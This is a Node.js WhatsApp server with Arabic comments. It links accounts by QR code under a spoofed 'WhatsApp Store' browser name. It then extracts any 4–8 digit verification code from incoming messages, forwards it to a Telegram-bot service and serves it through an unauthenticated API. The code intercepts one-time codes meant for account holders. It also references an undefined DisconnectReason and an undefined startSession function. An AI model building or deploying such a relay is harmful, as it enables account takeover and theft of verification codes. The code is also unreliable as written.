// waha.js - سيرفر واتساب (نسخة مستقرة)
const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const express = require('express');
const http = require('http');
const app = express();
app.use(express.json());

// تخزين الجلسات المفتوحة
const sessions = {};
// تخزين طلبات الكود المعلقة
const pendingRequests = {};

// ====== API: فتح جلسة جديدة ======
app.post('/start-session', async (req, res) => {
    try {
        const { phone, sessionId } = req.body;
        
        if (!phone || !sessionId) {
            return res.json({ success: false, error: 'Missing phone or sessionId' });
        }
        
        // لو الجلسة مفتوحة بالفعل
        if (sessions[phone]) {
            return res.json({ success: true, status: 'already_connected' });
        }
        
        const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${sessionId}`);
        
        const sock = makeWASocket({
            auth: state,
            printQRInTerminal: true,
            browser: ['WhatsApp Store', 'Chrome', '1.0.0']
        });
        
        let responded = false;
        
        // حفظ الاعتماديات
        sock.ev.on('creds.update', saveCreds);
        
        // ⭐ معالجة حالة الاتصال
        sock.ev.on('connection.update', (update) => {
            const { connection, lastDisconnect, qr } = update;
            
            // إرسال QR للمستخدم
            if (qr && !responded) {
                responded = true;
                return res.json({ success: true, status: 'qr', qr: qr });
            }
            
            // اتصال ناجح
            if (connection === 'open') {
                sessions[phone] = { sock, sessionId };
                console.log(`✅ جلسة مفتوحة للرقم: ${phone}`);
                if (!responded) {
                    responded = true;
                    return res.json({ success: true, status: 'connected' });
                }
            }
            
            // إعادة اتصال تلقائي
            if (connection === 'close') {
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
                if (shouldReconnect) {
                    console.log(`🔄 إعادة اتصال ${phone}...`);
                    setTimeout(() => {
                        startSession(phone, sessionId);
                    }, 3000);
                } else {
                    delete sessions[phone];
                    console.log(`🚫 تم تسجيل الخروج: ${phone}`);
                }
            }
        });
        
        // ⭐ استقبال الرسايل واستخراج الأكواد
        sock.ev.on('messages.upsert', async (m) => {
            try {
                const msg = m.messages[0];
                if (!msg || !msg.message) return;
                
                // استخراج النص من الرسالة
                let text = '';
                if (msg.message.conversation) {
                    text = msg.message.conversation;
                } else if (msg.message.extendedTextMessage?.text) {
                    text = msg.message.extendedTextMessage.text;
                } else if (msg.message.imageMessage?.caption) {
                    text = msg.message.imageMessage.caption;
                }
                
                // البحث عن كود (4-8 أرقام)
                const codeMatch = text.match(/\b(\d{4,8})\b/);
                if (codeMatch) {
                    const code = codeMatch[1];
                    console.log(`📩 كود للرقم ${phone}: ${code}`);
                    
                    // تخزين الكود في الطلبات المعلقة
                    pendingRequests[phone] = {
                        code: code,
                        timestamp: Date.now(),
                        message: text
                    };
                    
                    // إرسال الكود لبوت تيليجرام
                    sendToTelegram(phone, code);
                }
            } catch (err) {
                console.error('خطأ في معالجة الرسالة:', err.message);
            }
        });
        
    } catch (err) {
        console.error('خطأ في /start-session:', err.message);
        if (!res.headersSent) {
            res.json({ success: false, error: err.message });
        }
    }
});

// ====== API: طلب الكود لرقم ======
app.post('/request-code', (req, res) => {
    try {
        const { phone } = req.body;
        
        if (!phone) {
            return res.json({ success: false, error: 'Missing phone' });
        }
        
        // لو فيه كود جاهز
        if (pendingRequests[phone]) {
            const data = pendingRequests[phone];
            // الكود صالح لمدة 5 دقايق
            if (Date.now() - data.timestamp < 300000) {
                return res.json({ success: true, code: data.code, message: data.message });
            }
            delete pendingRequests[phone];
        }
        
        // لو الجلسة مفتوحة، نستنى الكود
        if (sessions[phone]) {
            return res.json({ success: true, status: 'waiting', message: 'في انتظار الكود...' });
        }
        
        res.json({ success: false, error: 'الجلسة غير متاحة' });
    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

// ====== API: حالة الجلسة ======
app.get('/session-status/:phone', (req, res) => {
    const { phone } = req.params;
    if (sessions[phone]) {
        res.json({ success: true, status: 'connected' });
    } else {
        res.json({ success: true, status: 'disconnected' });
    }
});

// ====== API: قائمة الجلسات ======
app.get('/sessions', (req, res) => {
    const list = Object.keys(sessions).map(phone => ({
        phone,
        sessionId: sessions[phone].sessionId
    }));
    res.json({ success: true, sessions: list });
});

// ====== إرسال الكود لبوت تيليجرام ======
function sendToTelegram(phone, code) {
    const data = JSON.stringify({ phone, code });
    
    const options = {
        hostname: 'localhost',
        port: 5000,
        path: '/receive-code',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };
    
    const req = http.request(options);
    req.on('error', (e) => {
        console.error('فشل إرسال لبوت تيليجرام:', e.message);
    });
    req.write(data);
    req.end();
}

// ====== تشغيل السيرفر ======
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ سيرفر واتساب شغال على المنفذ ${PORT}`);
    console.log('📱 مستعد لاستقبال الجلسات...');
});

// تنظيف الكودات القديمة كل 10 دقايق
setInterval(() => {
    const now = Date.now();
    for (const phone in pendingRequests) {
        if (now - pendingRequests[phone].timestamp > 600000) {
            delete pendingRequests[phone];
        }
    }
}, 600000);